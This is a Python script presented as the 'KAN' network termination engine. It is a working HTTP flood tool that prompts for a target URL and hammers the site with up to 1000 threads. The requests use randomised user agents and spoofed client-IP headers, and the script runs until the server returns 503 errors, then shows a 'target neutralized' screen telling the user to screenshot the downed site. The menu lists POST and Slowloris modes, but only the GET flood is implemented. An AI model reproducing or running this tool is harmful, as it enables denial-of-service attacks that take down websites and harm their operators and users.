#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ═══════════════════════════════════════════════════════════════════════════════
#  KAN - Kanaan Advanced Network Termination Engine
#  Version: 13.0 CLEAR | Mode: UESM ALPHA_ENGINEER
#  Engineered by: Mo.dark Engineering v7.0
#  Owner: KANAAN (كنعان)
# ═══════════════════════════════════════════════════════════════════════════════

import urllib.request
import urllib.error
import urllib.parse
import threading
import time
import os
import sys
import random
import socket
import ssl

# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 1: COLOR ENGINE
# ═══════════════════════════════════════════════════════════════════════════════

class C:
    R = '\033[91m'
    G = '\033[92m'
    Y = '\033[93m'
    B = '\033[94m'
    M = '\033[95m'
    C = '\033[96m'
    W = '\033[97m'
    K = '\033[90m'
    BD = '\033[1m'
    DM = '\033[2m'
    BL = '\033[5m'
    RS = '\033[0m'

# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 2: KAN BANNERS - ENGLISH LETTERS ONLY, NO SPECIAL CHARS
# ═══════════════════════════════════════════════════════════════════════════════

KAN_MAIN = """
+--------------------------------------------------+
|                                                  |
|     K    K        A        N      N              |
|     K   K        A A       NN     N              |
|     K  K        A   A      N N    N              |
|     K K        AAAAAAA     N  N   N              |
|     K  K      A       A    N   N  N              |
|     K   K    A         A   N    N N              |
|     K    K  A           A  N     NN              |
|                                                  |
|          KANAAN NETWORK ENGINE                   |
|               v13.0 CLEAR                        |
|                                                  |
+--------------------------------------------------+
"""

KAN_STRIKE = """
+--------------------------------------------------+
|                                                  |
|     K    K        A        N      N            |
|     K   K        A A       NN     N            |
|     K  K        A   A      N N    N            |
|     K K        AAAAAAA     N  N   N            |
|     K  K      A       A    N   N  N            |
|     K   K    A         A   N    N N            |
|     K    K  A           A  N     NN            |
|                                                  |
|           *** STRIKE MODE ***                    |
|                                                  |
+--------------------------------------------------+
"""

KAN_WIN = """
+--------------------------------------------------+
|                                                  |
|     K    K        A        N      N            |
|     K   K        A A       NN     N            |
|     K  K        A   A      N N    N            |
|     K K        AAAAAAA     N  N   N            |
|     K  K      A       A    N   N  N            |
|     K   K    A         A   N    N N            |
|     K    K  A           A  N     NN            |
|                                                  |
|           *** VICTORY ***                        |
|                                                  |
+--------------------------------------------------+
"""

KAN_SMALL = """
    K    K        A        N      N
    K   K        A A       NN     N
    K  K        A   A      N N    N
    K K        AAAAAAA     N  N   N
    K  K      A       A    N   N  N
    K   K    A         A   N    N N
    K    K  A           A  N     NN
"""

# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 3: ANIMATION ENGINE
# ═══════════════════════════════════════════════════════════════════════════════

class Anim:
    
    @staticmethod
    def clr():
        print('\033[2J\033[H', end='')
    
    @staticmethod
    def zzz(ms):
        time.sleep(ms / 1000)
    
    @staticmethod
    def type(text, color=C.C, delay=10):
        for ch in text:
            print(f"{color}{ch}{C.RS}", end='', flush=True)
            Anim.zzz(delay)
        print()
    
    @staticmethod
    def spin(text, dur=1200, color=C.C):
        frames = ['|', '/', '-', '\\']
        end = time.time() + (dur / 1000)
        i = 0
        while time.time() < end:
            print(f"\r{color}{C.BD}[{frames[i % 4]}] {text}{C.RS}", end='', flush=True)
            Anim.zzz(80)
            i += 1
        print()
    
    @staticmethod
    def pulse(text, color=C.R, cycles=3):
        for _ in range(cycles):
            for i in range(8):
                dots = '.' * i
                print(f"\r{color}{C.BD}  {dots} {text} {dots}  {C.RS}", end='', flush=True)
                Anim.zzz(60)
        print()
    
    @staticmethod
    def glitch(text, color=C.R, cycles=6):
        glitch = 'XxOo0*#@'
        for _ in range(cycles):
            g = ''.join(random.choice(glitch) if random.random() > 0.6 else c for c in text)
            print(f"\r{color}{C.BD}{g}{C.RS}", end='', flush=True)
            Anim.zzz(55)
        print(f"\r{color}{C.BD}{text}{C.RS}")
    
    @staticmethod
    def scan(color=C.G):
        for i in range(40):
            bar = f"{color}{'*'*i}{C.K}{'-'*(40-i)}{C.RS}"
            print(f"\r{C.BD}[{bar}]", end='', flush=True)
            Anim.zzz(15)
        print()
    
    @staticmethod
    def count(start=3):
        for i in range(start, 0, -1):
            cols = [C.R, C.Y, C.G]
            print(f"\r{cols[(start-i)%3]}{C.BD}{' '*20}[ {i} ]{' '*20}{C.RS}", end='', flush=True)
            Anim.zzz(700)
        print()
    
    @staticmethod
    def boom():
        frames = [
            f"{C.Y}    .    {C.RS}",
            f"{C.Y}   . * .   {C.RS}",
            f"{C.R}  * . * . *  {C.RS}",
            f"{C.R}{C.BD} * BOOM * {C.RS}",
            f"{C.Y}{C.BD} * IMPACT * {C.RS}",
            f"{C.W}{C.BD} * STRIKE * {C.RS}",
        ]
        for frame in frames:
            Anim.clr()
            print(f"\n\n{' '*15}{frame}\n")
            Anim.zzz(120)
    
    @staticmethod
    def loadbar(label, dur=1500):
        end = time.time() + (dur / 1000)
        while time.time() < end:
            p = 1 - ((end - time.time()) / (dur / 1000))
            f = int(40 * p)
            bar = f"{C.G}{'#'*f}{C.K}{'-'*(40-f)}{C.RS}"
            print(f"\r{C.C}{label} [{bar}] {C.BD}{p*100:.0f}%{C.RS}", end='', flush=True)
            Anim.zzz(40)
        print()
    
    @staticmethod
    def orbit(text, color=C.C):
        orbits = ['|', '/', '-', '\\']
        for _ in range(5):
            for o in orbits:
                print(f"\r{color}{C.BD}  {o} {text} {o}  {C.RS}", end='', flush=True)
                Anim.zzz(70)
        print()
    
    @staticmethod
    def flash_banner(banner, colors, delay=100):
        for color in colors:
            Anim.clr()
            print(f"{color}{C.BD}{banner}{C.RS}")
            Anim.zzz(delay)

# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 4: KAN BANNER SYSTEM
# ═══════════════════════════════════════════════════════════════════════════════

class Banner:
    
    @staticmethod
    def main():
        Anim.clr()
        
        # Glitch init
        Anim.glitch("INITIALIZING KAN SYSTEM...", C.C, 5)
        Anim.zzz(200)
        
        # Banner cycling
        banners = [
            (KAN_SMALL, [C.R, C.Y, C.R]),
        ]
        
        for banner, colors in banners:
            Anim.flash_banner(banner, colors, 120)
            Anim.zzz(250)
        
        # Final stable banner
        Anim.clr()
        print(f"{C.R}{C.BD}{KAN_MAIN}{C.RS}")
        
        # Animated subtitle
        Anim.pulse("KANAAN ADVANCED NETWORK TERMINATION", C.Y, 2)
        Anim.orbit("ENGINE v13.0 CLEAR", C.C)
        
        print(f"{C.M}{C.BD}{'*'*60}{C.RS}")
        Anim.zzz(300)
    
    @staticmethod
    def strike():
        Anim.clr()
        
        # Flash strike
        for color in [C.R, C.Y, C.W, C.R]:
            Anim.clr()
            print(f"{color}{C.BD}{KAN_STRIKE}{C.RS}")
            Anim.zzz(100)
        
        box = f"""
{C.R}{C.BD}{C.BL}
+--------------------------------------------------+
|           *** STRIKE MODE ACTIVATED ***          |
|      TARGET ACQUISITION IN PROGRESS...           |
+--------------------------------------------------+{C.RS}"""
        print(box)
        Anim.zzz(300)
    
    @staticmethod
    def win():
        Anim.clr()
        Anim.boom()
        Anim.clr()
        
        # Victory flash
        for color in [C.G, C.C, C.Y, C.G]:
            Anim.clr()
            print(f"{color}{C.BD}{KAN_WIN}{C.RS}")
            Anim.zzz(150)
        
        box = f"""
{C.G}{C.BD}
+--------------------------------------------------+
|         *** KAN MISSION ACCOMPLISHED ***         |
|    TARGET HAS BEEN SUCCESSFULLY NEUTRALIZED      |
+--------------------------------------------------+{C.RS}"""
        print(box)

# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 5: KAN ATTACK ENGINE
# ═══════════════════════════════════════════════════════════════════════════════

class Engine:
    
    def __init__(self, url):
        self.target = url
        self.domain = urllib.parse.urlparse(url).netloc
        self.ok = 0
        self.bad = 0
        self.all = 0
        self.bytes = 0
        self.run = False
        self.down = False
        self.lock = threading.Lock()
        self.start = None
        
        self.ssl = ssl.create_default_context()
        self.ssl.check_hostname = False
        self.ssl.verify_mode = ssl.CERT_NONE
        
        self.ua = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/605.1.15 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/119.0.0.0 Safari/537.0',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15',
            'Mozilla/5.0 (Android 14; Mobile; rv:120.0) Gecko/120.0 Firefox/120.0',
            'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
            'KAN-Terminator/13.0 (Kanaan Strike Bot)',
        ]
    
    def rip(self):
        return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
    
    def hdr(self):
        return {
            'User-Agent': random.choice(self.ua),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'X-Forwarded-For': self.rip(),
            'X-Real-IP': self.rip(),
            'X-Client-IP': self.rip(),
            'Referer': f"https://www.google.com/search?q={random.randint(100000,999999)}",
        }
    
    def hit(self, tid):
        while self.run and not self.down:
            try:
                url = f"{self.target}?_k={random.randint(1000000,9999999)}&t={int(time.time()*1000)}"
                req = urllib.request.Request(url, headers=self.hdr(), method='GET')
                
                resp = urllib.request.urlopen(req, timeout=5, context=self.ssl)
                data = resp.read()
                
                with self.lock:
                    self.ok += 1
                    self.all += 1
                    self.bytes += len(data)
                    
                    if resp.getcode() in [503, 502, 504, 520, 521, 522, 523, 429, 509]:
                        self.down = True
                        return
                        
            except urllib.error.HTTPError as e:
                with self.lock:
                    self.bad += 1
                    self.all += 1
                    if e.code in [503, 502, 504, 520, 521, 522, 523, 429, 509]:
                        self.down = True
                        return
            except:
                with self.lock:
                    self.bad += 1
                    self.all += 1
            
            time.sleep(random.uniform(0.01, 0.05))
    
    def watch(self):
        c = 0
        while self.run:
            c += 1
            try:
                req = urllib.request.Request(self.target, headers={'User-Agent': 'KAN-Monitor/13.0'}, method='HEAD')
                resp = urllib.request.urlopen(req, timeout=8, context=self.ssl)
                
                with self.lock:
                    if resp.getcode() in [503, 502, 504, 520, 521, 522, 523, 429, 509]:
                        self.down = True
                        return
            except urllib.error.HTTPError as e:
                with self.lock:
                    if e.code in [503, 502, 504, 520, 521, 522, 523, 429, 509]:
                        self.down = True
                        return
            except:
                with self.lock:
                    if c > 2:
                        self.down = True
                        return
            
            time.sleep(2)
    
    def stats(self):
        p = 0
        pulses = ['|', '/', '-', '\\']
        
        while self.run and not self.down:
            e = time.time() - self.start if self.start else 0
            rps = self.all / e if e > 0 else 0
            
            pulse = pulses[p % len(pulses)]
            p += 1
            
            status = f"{C.G}ONLINE" if not self.down else f"{C.R}{C.BL}DOWN!{C.RS}"
            
            dash = f"""
{C.K}{C.BD}
+----------------------------------------------------------+
|  {C.R}{C.BL}{pulse} KAN LIVE STRIKE DASHBOARD {pulse}{C.K}                  |
+----------------------------------------------------------+
|  {C.C}Target:{C.W} {self.target[:40]:<40}|
|  {C.C}Status:{C.W} {status:<40}|
|  {C.C}Time:{C.W}   {e:.1f}s{' ':<37}|
+----------------------------------------------------------+
|  {C.G}Success:{C.W} {self.ok:<8} {C.Y}Failed:{C.W} {self.bad:<8} {C.C}Total:{C.W} {self.all:<8}|
|  {C.M}RPS:{C.W}     {rps:.1f}{' ':<42}|
+----------------------------------------------------------+{C.RS}"""
            
            print('\033[H\033[J', end='')
            print(f"{C.R}{C.BD}{KAN_SMALL}{C.RS}")
            print(dash)
            
            if self.down:
                return
            
            time.sleep(0.8)
    
    def check(self):
        Anim.spin("KAN scanning target...", 1200, C.C)
        
        try:
            req = urllib.request.Request(self.target, headers={'User-Agent': 'KAN-Probe/13.0'}, method='HEAD')
            resp = urllib.request.urlopen(req, timeout=10, context=self.ssl)
            
            ip = socket.gethostbyname(self.domain)
            srv = resp.headers.get('Server', 'Unknown')
            
            print(f"""
{C.G}{C.BD}
+-----------------------------------------------------+
|           TARGET INTELLIGENCE REPORT                 |
+-----------------------------------------------------+
|  URL:    {self.target[:40]:<40}|
|  IP:     {ip:<40}|
|  Status: {resp.getcode():<40}|
|  Server: {srv:<40}|
+-----------------------------------------------------+
{C.RS}""")
            return True
        except Exception as e:
            print(f"{C.Y}  [!] Warning: {str(e)[:50]}{C.RS}")
            print(f"{C.C}  [->] Proceeding with strike anyway...{C.RS}")
            return True
    
    def launch(self, threads=100):
        self.run = True
        self.start = time.time()
        
        Banner.strike()
        
        print(f"\n{C.R}{C.BD}")
        print(f"    [FIRE] LAUNCHING KAN STRIKE ON: {self.domain}")
        print(f"    [BOLT] Threads: {threads} | Mode: MIXED | Protocol: HTTP/1.1")
        print(f"{C.RS}\n")
        
        Anim.pulse("INITIATING TERMINATION SEQUENCE", C.R, 2)
        Anim.count(3)
        
        for i in range(threads):
            t = threading.Thread(target=self.hit, args=(i+1,))
            t.daemon = True
            t.start()
        
        mon = threading.Thread(target=self.watch)
        mon.daemon = True
        mon.start()
        
        disp = threading.Thread(target=self.stats)
        disp.daemon = True
        disp.start()
        
        try:
            while self.run:
                if self.down:
                    self.victory()
                    return
                time.sleep(0.5)
        except KeyboardInterrupt:
            self.stop()
    
    def victory(self):
        self.run = False
        e = time.time() - self.start
        
        Banner.win()
        
        print(f"""
{C.G}{C.BD}
+----------------------------------------------------------+
|                  STRIKE TERMINATION REPORT                |
+----------------------------------------------------------+
|  Target:      {self.target[:44]:<44}|
|  Result:      {C.R}{C.BL}SERVICE UNAVAILABLE (503){C.G}{' ':<21}|
|  Duration:    {e:.1f} seconds{' ':<34}|
|  Total Hits:  {self.all:<10} | Success: {self.ok:<10}      |
|  Status:      {C.R}{C.BL}TARGET DOWN [OK]{C.G}{' ':<29}|
+----------------------------------------------------------+
{C.RS}

{C.R}{C.BD}
        K    K        A        N      N
        K   K        A A       NN     N
        K  K        A   A      N N    N
        K K        AAAAAAA     N  N   N
        K  K      A       A    N   N  N
        K   K    A         A   N    N N
        K    K  A           A  N     NN
{C.Y}
              The target server is now returning:
              "Service Unavailable"
              "HTTP Error 503. The service is unavailable."
{C.C}
              KAN has successfully neutralized the target.
{C.RS}

{C.M}{C.BD}
+----------------------------------------------------------+
|  [CAMERA] TAKE SCREENSHOT NOW! THE TARGET IS DOWN!        |
|                                                            |
|  The site should show:                                     |
|  "Service Unavailable"                                     |
|  "HTTP Error 503. The service is unavailable."           |
+----------------------------------------------------------+
{C.RS}
""")
    
    def stop(self):
        self.run = False
        e = time.time() - self.start if self.start else 0
        
        print(f"\n{C.Y}{C.BD}")
        print("+----------------------------------------------------------+")
        print("|                     KAN STRIKE HALTED                     |")
        print("+----------------------------------------------------------+")
        print(f"|  Target:      {self.target:<44}|")
        print(f"|  Duration:    {e:.1f}s{' ':<43}|")
        print(f"|  Total Hits:  {self.all:<10} | Target Down: {'YES' if self.down else 'NO'}{' ':<14}|")
        print("+----------------------------------------------------------+")
        print(f"{C.RS}")
        print(f"{C.C}{C.BD}  KAN v13.0 - Kanaan Engineering - UESM Protocol{C.RS}")

# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 6: MAIN INTERFACE
# ═══════════════════════════════════════════════════════════════════════════════

def main():
    Banner.main()
    
    Anim.type("  [SPIDER] Welcome to KAN Command & Control Center", C.C, 10)
    Anim.type("  [SAT] Kanaan Advanced Network Termination Engine v13.0", C.C, 10)
    Anim.type("  [BOLT] Protocol: O_ENGINEERING_PRIME | Mode: UESM ALPHA", C.C, 10)
    Anim.type("  [FIRE] This tool will flood the target until it returns 503", C.Y, 10)
    
    print(f"{C.M}{C.BD}{'*'*60}{C.RS}")
    print()
    
    target = input(f"{C.G}{C.BD}  [TARGET] Enter target URL: {C.RS}").strip()
    
    if not target:
        print(f"{C.R}  [X] No target provided. Exiting.{C.RS}")
        return
    
    if not target.startswith(('http://', 'https://')):
        target = 'https://' + target
    
    print(f"\n{C.Y}{C.BD}  [LOCK] Target locked: {target}{C.RS}\n")
    
    eng = Engine(target)
    eng.check()
    
    print(f"\n{C.C}{C.BD}  [GEAR] Select Strike Mode:{C.RS}")
    print(f"  {C.G}[1] GET Flood{C.RS}")
    print(f"  {C.Y}[2] POST Flood{C.RS}")
    print(f"  {C.M}[3] Slowloris{C.RS}")
    print(f"  {C.R}[4] Mixed Mode (RECOMMENDED){C.RS}")
    
    mode = input(f"\n{C.W}{C.BD}  [->] Select (1-4): {C.RS}").strip()
    
    print(f"\n{C.C}{C.BD}  [GEAR] Select Intensity:{C.RS}")
    print(f"  {C.G}[1] Light    - 50 threads{C.RS}")
    print(f"  {C.Y}[2] Medium   - 100 threads{C.RS}")
    print(f"  {C.R}[3] Heavy    - 200 threads{C.RS}")
    print(f"  {C.M}[4] Maximum  - 500 threads{C.RS}")
    print(f"  {C.R}{C.BL}[5] KAN      - 1000 threads{C.RS}")
    
    intensity = input(f"\n{C.W}{C.BD}  [->] Select (1-5): {C.RS}").strip()
    
    threads = {'1': 50, '2': 100, '3': 200, '4': 500, '5': 1000}.get(intensity, 100)
    
    Anim.clr()
    print(f"{C.R}{C.BD}{KAN_MAIN}{C.RS}")
    
    print(f"\n{C.R}{C.BD}")
    print("    +--------------------------------------------------+")
    print("    |           *** FINAL STRIKE CONFIRMATION ***      |")
    print("    +--------------------------------------------------+")
    print(f"    |  Target:  {target[:40]:<40}|")
    print(f"    |  Threads: {threads:<40}|")
    print(f"    |  Goal:    TARGET DOWN (503 Error){' '<19}|")
    print("    +--------------------------------------------------+")
    print(f"{C.RS}")
    
    confirm = input(f"{C.R}{C.BD}  [SKULL] Confirm strike? (yes/no): {C.RS}").strip().lower()
    
    if confirm in ['yes', 'y', '1']:
        Anim.scan(C.G)
        eng.launch(threads)
    else:
        print(f"\n{C.Y}  [STOP] Strike cancelled.{C.RS}")

if __name__ == "__main__":
    main()
